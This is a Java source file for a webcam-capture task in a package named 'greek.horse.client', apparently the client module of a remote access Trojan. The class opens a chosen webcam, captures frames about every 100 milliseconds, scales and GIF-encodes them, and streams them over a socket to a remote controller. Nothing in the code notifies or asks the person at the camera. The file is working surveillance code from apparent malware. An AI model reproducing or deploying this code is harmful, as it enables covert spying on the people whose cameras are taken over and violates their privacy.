package greek.horse.client.tasks;

import com.github.sarxos.webcam.Webcam;
import greek.horse.client.ClientSocketManager;
import greek.horse.models.FunctionTicket;
import greek.horse.models.WebcamInfoWrapper;
import net.coobird.thumbnailator.Thumbnails;
import org.apache.log4j.Logger;
import org.jetbrains.annotations.NotNull;

import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.HashMap;
import java.util.concurrent.atomic.AtomicReference;

public class ClientWebcamTask implements Runnable {
    private final ClientSocketManager client;
    private FunctionTicket ticket;
    private final AtomicReference<WebcamInfoWrapper> info = new AtomicReference<>();
    private static final int interval = 100;

    private static final Logger log = Logger.getLogger(ClientWebcamTask.class);
    private Webcam webcam;

    public ClientWebcamTask(ClientSocketManager client) {
        this.client = client;
    }

    @Override
    public void run() {
        while (client.getRunning().get()) {
            if (ticket != null && this.client.getFixedMap().containsKey(ticket)) {

                long time = System.currentTimeMillis() + interval;

                while (client.getRunning().get() && client.getFixedMap().containsKey(ticket)) {
                    try {
                        if (System.currentTimeMillis() < time) {
                            Thread.sleep(10);
                            continue;
                        } else {
                            time = System.currentTimeMillis() + interval;
                        }
                        double w = info.getAcquire().getWidth();
                        double h = info.getAcquire().getHeight();

                        HashMap<FunctionTicket, Object> answerMap = new HashMap<>();
                        answerMap.put(ticket, getBytesObject(w, h));
                        client.getOos().getAcquire().writeObject(answerMap);
                        client.getOos().getAcquire().flush();

                    } catch (Exception e) {
                        log.error("Error capturing webcam",e);
                    }
                }

            }
            try {
                Thread.sleep(500);
            } catch (InterruptedException e) {
                log.error(e);
            }
        }
    }

    @NotNull
    private Object getBytesObject(double W, double H) throws IOException, InterruptedException {
        while(!webcam.isOpen()){
            Thread.sleep(10);
        }
        BufferedImage screenCapture = webcam.getImage();

        double w = screenCapture.getWidth();
        double h = screenCapture.getHeight();
        double x = W / w;
        double y = H / h;
        double lastScale = Math.min(x, y);

        BufferedImage bi = Thumbnails.of(screenCapture).forceSize((int) (w * lastScale), (int) (h * lastScale)).asBufferedImage();

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ImageIO.write(bi, "gif", baos);
        return baos.toByteArray();
    }

    public void setTicket(FunctionTicket ticket) {
        this.ticket = ticket;
    }

    public void setInfo(WebcamInfoWrapper info) {
        this.info.lazySet(info);

        Webcam newWebcam = Webcam.getWebcamByName(info.getWebcamName());
        if (this.webcam != null){
            if (!newWebcam.getName().contentEquals(this.webcam.getName())){
                this.webcam.close();
                this.webcam = newWebcam;
                this.webcam.open(true);
            }
        } else {
            this.webcam = newWebcam;
            this.webcam.open(true);
        }
    }
}
